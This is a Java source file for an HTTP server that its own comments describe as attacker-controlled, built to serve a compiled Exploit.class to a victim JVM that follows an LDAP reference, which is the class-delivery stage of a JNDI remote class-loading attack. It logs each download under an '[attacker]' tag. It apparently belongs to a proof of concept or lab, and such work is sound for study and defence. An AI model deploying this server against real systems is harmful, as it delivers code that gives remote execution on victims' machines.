import com.sun.net.httpserver.HttpServer;

import java.io.File;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;

/**
 * Attacker-controlled HTTP server. Serves the compiled Exploit.class so the
 * victim JVM can download it after following the LDAP reference. Uses only the
 * JDK's built-in HttpServer (no dependencies).
 */
public class FileServer {
    public static void main(String[] args) throws Exception {
        int port = 8888;
        final String dir = args.length > 0 ? args[0] : ".";
        HttpServer s = HttpServer.create(new InetSocketAddress(port), 0);
        s.createContext("/", ex -> {
            String path = ex.getRequestURI().getPath().replaceFirst("^/", "");
            File f = new File(dir, path);
            if (f.isFile()) {
                byte[] b = Files.readAllBytes(f.toPath());
                ex.getResponseHeaders().add("Content-Type", "application/octet-stream");
                ex.sendResponseHeaders(200, b.length);
                OutputStream os = ex.getResponseBody();
                os.write(b);
                os.close();
                System.out.println("[attacker] served " + path + " (" + b.length + " bytes)");
            } else {
                ex.sendResponseHeaders(404, -1);
                ex.close();
            }
        });
        s.setExecutor(null);
        System.out.println("[attacker] HTTP class server on :" + port + " serving " + dir);
        s.start();
    }
}
